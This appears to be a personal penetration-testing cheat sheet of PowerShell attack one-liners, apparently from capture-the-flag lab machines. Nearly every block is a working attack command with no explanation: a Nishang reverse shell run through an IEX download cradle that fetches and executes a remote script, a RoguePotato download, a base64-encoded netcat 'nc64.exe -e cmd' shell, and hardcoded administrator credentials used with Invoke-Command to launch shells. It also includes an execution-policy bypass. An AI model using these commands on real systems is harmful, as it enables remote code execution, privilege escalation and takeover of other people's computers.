# Powershell

powershell reverse shell

```
cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 shell.ps1

#edit this file to have the required reverse shell at the end
#and change the Invoke-PowerShellTcp to nopnopnop

:%s/Invoke-PowerShellTcp/nop/g
^^ in vim

nop -Reverse -IPAddress 10.10.14.28 -Port 4243
this line at the end of shell.ps1

# this is what gets us the reverse shell
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.64:81/shell.ps1')"

echo IEX(New-Object Net.WebClient).downloadString('http://10.10.14.64:81/shell.ps1') | powershell -noprofile -
```

smbserver or powershell download file

```
invoke-webrequest -uri 'http://10.10.14.28/RoguePotato.exe' -outfile .\rp.exe
```

powershell run b64'ed commands

```
echo 'cmd /c "\\10.10.14.6\share\nc64.exe -e cmd 10.10.14.6 443"' | iconv -f ascii -t utf-16le | base64 -w0
powershell /enc YwBt....
```

powershell su root

```
$password = convertto-securestring -AsPlainText -Force -String "butterfly!#1";
$credential = new-object -typename System.Management.Automation.PSCredential -argumentlist "SNIPER\Administrator",$password;
Invoke-Command -ComputerName LOCALHOST -ScriptBlock { C:\Users\chris\nc.exe -e cmd.exe 10.10.14.23 5555} -credential $credential;
```

run as

```
$username = "BART\Administrator"
$password = "3130438f31186fbaf962f407711faddb"
$secstr = New-Object -TypeName System.Security.SecureString
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.14.64:81/shell.ps1') } -Credential $cred -Computer localhost
```

```
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
```
